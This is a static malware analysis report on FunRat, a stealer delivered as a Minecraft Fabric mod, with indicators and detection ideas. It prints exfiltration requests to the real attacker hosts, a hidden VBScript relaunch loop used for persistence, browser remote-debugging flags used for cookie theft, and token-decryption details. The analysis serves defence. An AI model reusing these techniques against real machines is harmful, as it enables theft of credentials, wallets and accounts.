# FunRat: multi-stage Minecraft session stealer and Windows credential harvester

FunRat is a Windows-oriented, multi-stage malware family delivered as a Fabric client mod.
The first stage runs inside Minecraft, steals the active session, reports it to attacker
infrastructure, and loads a second-stage downloader. The second stage resolves a panel
through TON and launches a large Java collection implant. An optional fourth component
steals Discord tokens and uses them to spam the victim's friends and servers.

The chain is designed to keep working when individual hosts or relay domains are blocked:
stage locations come from TON, a Cloudflare Worker relay, and panel configuration rather
than from a single hard-coded URL.

## At a glance

1. A Fabric client entrypoint reads the Minecraft account name, UUID, and access token.
2. It POSTs a JSON report to `<relay>/report`, with up to 24 retries.
3. It resolves a stage URL from TON, a relay, or panel configuration, downloads a JAR,
   drops it under `%APPDATA%\Microsoft\JavaSec`, and loads it reflectively.
4. The second stage repeats the TON/config lookup, downloads a Java implant into
   `%APPDATA%\Microsoft\SecurityUpdates`, and launches it with the stolen session data.
5. The Java implant loads per-victim settings from `https://funrat.co`, collects browser
   credentials, wallets, Telegram data, Minecraft accounts, desktop files, screenshots,
   and system inventory, then uploads a ZIP to `/api/ingest`.
6. If the victim is not premium, a Discord module steals local tokens, validates them, and
   spams friends and guild channels with FunRat advertising.

## 1. First stage: Fabric session theft and loader

### 1.1 Entrypoint

The mod registers a Fabric client initializer. On client startup it obtains the Minecraft
game instance and reads:

- account name,
- profile UUID,
- access token.

The calls are resolved through reflection and Fabric's mapping resolver, so the same code
works across mapped and intermediary Minecraft builds. `String.valueOf` is applied to each
value, so a missing value becomes the literal string `null`.

### 1.2 Session report

Before starting the report thread, the loader resolves a report base URL through
`plankton()`. It then starts a thread named `thin-report` and prints `[thin] start`.

The report is sent to:

```text
POST <base>/report
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
            (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
connect timeout: 15 s
read timeout:    15 s
```

The body is UTF-8 JSON in this exact order:

```json
{"name":"<name>","uuid":"<uuid>","token":"<token>","receiver":"<name>","key":"<key>"}
```

`receiver` duplicates the account name. `key` is the loader cipher with every `=` removed;
in the analysed build that leaves the 36-character UUID portion of the padded cipher.

The sender makes up to 24 attempts. A 2xx response prints `[thin] ok code=<code>` and stops.
A 4xx response other than 429 prints `[thin] give up code=<code>` and stops. Everything else,
including 429, 3xx, 5xx, and exceptions, is retried with exponential backoff from 15 seconds
up to 5 minutes.

### 1.3 Stage URL resolution

`plankton()` performs a TON Center `runGetMethod` call:

```text
POST https://toncenter.com/api/v2/runGetMethod
Content-Type: application/json

{"address":"EQChU6Zxa_y2fKeeCaSDubGcFZizRdRVSArwAh6qJtfe9NKZ",
 "method":"link","stack":[["int","8"]]}
```

The first `"b64":"..."` match is Base64-decoded and interpreted as UTF-8. The result is split
on commas and the first reachable URL is selected with a `HEAD` request. If TON fails, the
loader falls back to:

```text
https://relay-3f9c71.kartohaantoha36-6a9.workers.dev
https://relay-mirror.kartohaantoha36-6a9.workers.dev
```

The stage list is built from `<base>/config`, using keys `"0"` and `"7"`. Values are split on
commas, trimmed, and accepted only when they start with `http`. If no usable value is found,
two hard-coded TON accounts are queried through `tonapi.io`; each returned cell is parsed and
normalised into a stage URL. URLs without `/api/` get `/api/hlam/files/4001` appended.
Cloudflare Worker URLs are also mirrored through the relay and relay-mirror hosts.

### 1.4 Drop and reflective load

For each candidate URL the loader:

1. Prints `URL: <url>`.
2. Downloads the body with a 4-minute read timeout and requires HTTP 200.
3. Writes it to a temporary part file under `%APPDATA%\Microsoft\JavaSec`, syncs it, and
   renames or copies it to the final JAR.
4. Rejects the JAR unless the expected class entry is present.
5. Loads the dropped stage class with a `URLClassLoader` and invokes the first method matching
   `(String, String, String, String)`; if absent, it tries
   `(String, String, String, String, int)` or `(..., Integer)`.

The four arguments are the stolen name, UUID, token, and the full 106-character cipher:
a 36-character UUID followed by 70 `=` padding characters. The stage loader is skipped when
the token is exactly 15 characters, but the report is still sent.

## 2. Second stage: TON-backed downloader

### 2.1 Base and config resolution

The second stage resolves its base with the same TON `link(8)` call and falls back to:

```text
https://telemetry-relay.kartohaantoha36-6a9.workers.dev
```

It reads `<base>/config` and uses:

- `"1"` for the Java implant URL,
- `"2"` for the Discord spam module URL,
- `"3"` for the panel base.

If a URL is missing or does not start with `http`, the stage appends the corresponding panel
fallback:

```text
/api/hlam/files/4001   (implant)
/api/hlam/files/4003   (Discord module)
```

The panel fallback is `https://funrat.top`. Downloads require HTTP 200, use a 4-minute read
timeout, and are written to `%APPDATA%\Microsoft\SecurityUpdates`. There is no ZIP validation,
no atomic rename, and no cleanup of partial files after a mid-stream failure.

### 2.2 Implant launch

After downloading the implant, the stage starts an unnamed thread for the premium/spam check
and launches:

```text
<current java executable> -jar <implant> <name> <uuid> <token> <cipher>
```

The current Java executable is found with PowerShell:

```text
powershell.exe -NoProfile -Command (Get-Process -Id <pid>).Path
```

If that fails, it falls back to `java`.

### 2.3 Premium gate and Discord module

The spam branch does nothing when the cipher starts with:

```text
30e3267e-d80c-4a8f-84e2-bb475930a37c
```

Otherwise it requests:

```text
GET <panel>/api/premium-status?id=<cipher>
```

If the response contains `"premium":true`, the branch stops. A failed premium request also
stops the branch. If the token is not premium, it downloads the Discord module from config
slot `"2"` and launches it with no arguments.

### 2.4 Standalone modes

The second stage can also be started directly:

| Arguments | Effect |
|---|---|
| 4 arguments | Treated as name, UUID, token, cipher |
| 2 arguments, second is `Discord` | Name/UUID/token become placeholders; first argument is the cipher |
| 1 argument | Same placeholder path; the argument is the cipher |
| anything else | No-op |

These modes are separate from the four-argument path used by the first-stage loader.

## 3. Third stage: Windows collection implant

### 3.1 Startup and per-victim settings

The implant accepts four arguments. The fourth is the cipher with `=` removed. If the cipher
starts with the premium UUID:

```text
30e3267e-d80c-4a8f-84e2-bb475930a37c
```

the remainder becomes the settings ID and the UUID prefix becomes the key. Otherwise the
settings ID is empty and the full cipher is the key.

Settings are loaded from:

```text
GET https://funrat.co/api/app-settings-public?id=<URL-encoded settings ID>
Accept: application/json
User-Agent: Chrome 120 on Windows
```

The response controls more than 70 module flags, including Telegram, Discord, desktop
collection, desktop and browser wallets, Steam, Minecraft and third-party launchers, browser
cookie/password modules, screenshots, and system inventory.

The implant waits up to two minutes for its worker pool to finish, then formats the upload
metadata and calls the exfiltration routine. It also writes a local log file.

### 3.2 Collection modules

Enabled modules run in parallel and write into a temporary collection directory. The main
collectors are:

- **Telegram:** locates Telegram `tdata` directories and copies them.
- **Discord:** extracts local Discord tokens (see section 4).
- **Screenshots:** captures the current screen as a PNG.
- **Desktop wallets:** collects wallet files and LevelDB stores for Exodus, Electrum,
  Atomic, Guarda, Coinomi, and related wallets.
- **Browser wallets:** collects extension storage for MetaMask, Phantom, Binance, Bybit,
  Coinbase, Trust, Ronin, and other wallet extensions.
- **Desktop files:** recursively copies the user's Desktop contents.
- **Minecraft:** collects launcher account data, MSA credential blobs, and launcher data for
  Lunar, Feather, Essential, IAs, Prism, and MultiMC.
- **Epic Games:** copies launcher configuration from `%LOCALAPPDATA%` and `%APPDATA%`.
- **EA:** scans EA Desktop and Origin configuration trees for token, auth, account, login,
  credential, refresh, access, entitlement, JSON, INI, CFG, and properties files, then writes
  a summary.
- **Apple:** scans Chromium cookie stores for Apple web-auth and session tokens.
- **Xbox:** harvests Xbox Live/MSA refresh material from Windows Credential Manager and
  exchanges it for XSTS tokens.
- **System inventory:** writes a system-inventory text file with host, hardware, security,
  network, and installed-software data.

The inventory collector covers:

- OS version, architecture, uptime, boot time, timezone, locale, and Java version;
- MachineGuid, Windows ProductId, and volume serial numbers;
- local user/group identity, admin group membership, UAC state, and integrity level;
- CPU, memory, disks, GPU, and battery;
- Defender status, antivirus products, and firewall profiles;
- DNS server configuration, with `ipconfig /all` as a fallback;
- installed programs, running processes, Run keys, startup folders, enabled scheduled tasks,
  and running automatic services;
- browser presence and per-user folder sizes;
- VM/sandbox indicators including VirtualBox, VMware, KVM, QEMU, Hyper-V, Xen, Bochs,
  Parallels, and generic sandbox strings.

### 3.3 Browser credential theft

The browser modules cover Chrome, Edge, Brave, Vivaldi, Yandex, Opera, Opera GX, Chromium,
and Firefox. The native App-Bound key path specifically targets Chrome, Edge, and Brave. The
implant reads the browser's `Local State`, extracts `os_crypt.encrypted_key` or
`app_bound_encrypted_key`, and decrypts the key with DPAPI or AES-GCM.

Two collection paths are implemented:

- **Remote debugging:** launches the browser with
  `--restore-last-session --remote-debugging-port=9222 --headless --remote-allow-origins=*`
  and `--user-data-dir=<temp>` (plus an optional profile directory), then sends
  `Network.getAllCookies` over the DevTools websocket.
- **Native injection:** extracts a bundled DLL under a temporary name, injects it with
  `LoadLibraryW`, and communicates over a named pipe to decrypt App-Bound encrypted keys.

Results are written as `\Cookies` and `\Passwords` under the collection directory.

### 3.4 Persistence

A separate persistence routine creates:

```text
%APPDATA%\Microsoft\SecurityUpdates
```

It downloads two JARs from panel config slots `"1"` and `"2"` into that directory. It then
writes a VBScript under `%APPDATA%\AutoStartMini` and launches it. The script runs hidden and
restarts one of the JARs every 10 seconds:

```vbscript
Set s = CreateObject("WScript.Shell")
Do
  s.Run """<java>"" -jar ""<SecurityUpdates>\<launcher JAR>"" <panel URL>", 0, True
  WScript.Sleep 10000
Loop
```

The observed persistence path is this VBS relaunch loop. The implant also collects existing
Run keys and startup folders as part of system inventory; no Run-key or scheduled-task
creation was observed in the analysed code.

### 3.5 Exfiltration

The collection directory is named:

```text
%TEMP%\_flrG~j<random>_qdr-<username>
```

It is zipped and uploaded to:

```text
POST https://funrat.co/api/ingest
Content-Type: multipart/form-data; boundary=----IngestBoundary
User-Agent: Chrome 120 on Windows
```

The multipart body contains a metadata part named `metadata` with
`application/json; charset=UTF-8`, followed by the ZIP file part. The metadata JSON is:

```json
{ "name": "<name>", "uuid": "<uuid>", "token": "<token>", "pcName": "<user>@<host>", "key": "<key>" }
```

The upload routine is named `openTor`, but it does not configure Tor or a SOCKS proxy. It
opens a direct `URL.openConnection()` with the supplied method and timeouts. No live C2 was
contacted during this analysis.

## 4. Fourth stage: Discord token theft and spam

### 4.1 Token sources

The Discord module reads local Discord, Discord Canary, and Discord PTB token stores, plus
browser stores for Chromium, Chrome and its Beta/Dev/SxS variants, Edge, Brave, Vivaldi,
Opera, Opera GX, Yandex, Iridium, Epic Privacy Browser, Falkon, Firefox, Waterfox, LibreWolf,
and Pale Moon.

Tokens are decrypted with the browser's `Local State` key. The module handles DPAPI-protected
keys and AES-GCM payloads using the `dQw4w9WgXcQ:` prefix, a 12-byte IV, and a 128-bit GCM
tag.

### 4.2 Validation and targeting

Each token is validated against:

```text
https://discord.com/api/v9/users/@me
https://discord.com/api/v6/users/@me
```

The module also queries guilds, relationships, channels, and billing data. Tokens already in
the guild:

```text
1443109598579003414
```

are treated as tester/whitelisted and skipped with `Stop testing rat yourself`. The same flag
then suppresses any remaining tokens in the outer loop. For all other tokens the module:

1. Loads the token's guild list.
2. Starts a mass-DM thread against the token's relationships.
3. Enumerates each guild's text channels and checks send permission.
4. Sends the advertising message to text channels where the token has `SEND_MESSAGES`
   permission; the message itself starts with `@everyone @here`.

### 4.3 Spam content

The message claims the victim's Minecraft account is already stolen and advertises the
malware with links to:

```text
https://funrat.co/
https://t.me/weloverat
https://discord.gg/TSYMmF9B2y
```

Channel messages begin with `@everyone @here`; direct messages mention the target user.
Failures such as closed DMs, missing permissions, captchas, and HTTP errors are printed but
do not stop the loop.

### 4.4 Payment data and Tor

The module requests:

```text
https://discord.com/api/v6/users/@me/billing/payment-sources
```

and parses payment-source/card metadata. In the analysed build the parsed payment data is
not uploaded or otherwise used; only the token is retained for spam.

A `TorBridge` class can start a local Tor SOCKS listener on `127.0.0.1:9050`, but the
decompiled Discord entrypoint does not reference it. The observed spam path uses direct
Discord API connections, not Tor.

## 5. Host and network indicators

### 5.1 Host artifacts

- `%APPDATA%\Microsoft\JavaSec` — first-stage drop directory.
- `%APPDATA%\Microsoft\SecurityUpdates` — second- and third-stage JAR directory.
- `%APPDATA%\AutoStartMini` — VBScript persistence directory.
- `%TEMP%\_flrG~j*_qdr-*` — per-victim collection directory.
- A system-inventory file plus `Wallets`, `WebWallets`, `desktop`, `Telegram`, `Cookies`,
  and `Passwords` inside the collection directory.
- Browser processes started with `--remote-debugging-port=9222` and a temporary profile.
- A `java -jar ... <name> <uuid> <token> <cipher>` child process.
- A hidden `wscript` process running the restart loop.

### 5.2 Network indicators

- TON address `EQChU6Zxa_y2fKeeCaSDubGcFZizRdRVSArwAh6qJtfe9NKZ`, method `link`, argument `8`.
- Fallback TON accounts `EQCsNH1LY2PQeqG2HKSk2myObNTgCuREdq1IVvZFL4k_5iia` and
  `EQBaz-F9o6nHrQ16Z_jTGZShLyRNEMRtS0OWMYs0GNQK_PHA`.
- `telemetry-relay.kartohaantoha36-6a9.workers.dev` and
  `relay-mirror.kartohaantoha36-6a9.workers.dev`.
- `https://funrat.top` and `https://funrat.co`.
- `/report`, `/config`, `/api/hlam/files/4001`, `/api/hlam/files/4003`,
  `/api/premium-status`, `/api/app-settings-public`, and `/api/ingest`.
- Discord API calls to `/api/v9/users/@me`, `/api/v6/users/@me`,
  `/api/v9/users/@me/guilds`, `/api/v10/guilds/<id>/channels`,
  `/api/v9/users/@me/relationships`, `/api/v9/users/@me/channels`, and
  `/api/v6/users/@me/billing/payment-sources`.
- Tester/whitelist guild `1443109598579003414`.
- Spam links `funrat.co`, `t.me/weloverat`, and `discord.gg/TSYMmF9B2y`.

## 6. Detection opportunities

- A Minecraft/Fabric process spawning `java -jar` with four positional arguments, followed by
  a second Java process that writes under `%APPDATA%\Microsoft\SecurityUpdates`.
- A `wscript` process launching a JAR from `%APPDATA%\Microsoft\SecurityUpdates` in a loop.
- Browser launches containing `--remote-debugging-port=9222`, `--headless`, and
  `--remote-allow-origins=*`.
- Outbound requests to the relay, panel, TON, and Discord endpoints above.
- Creation of `%TEMP%\_flrG~j*_qdr-*` directories and ZIP uploads to `/api/ingest`.
- Discord tokens being used to send identical advertising messages to many channels or DMs.

## 7. Safety

Treat every stage as live malware. Use an isolated Windows VM with no production credentials,
no real browser profiles, no Discord session, and no wallet data. Do not contact the TON
address, relay, panel, or stage URLs from a production host. The analysis here is static; no
live infrastructure was queried.
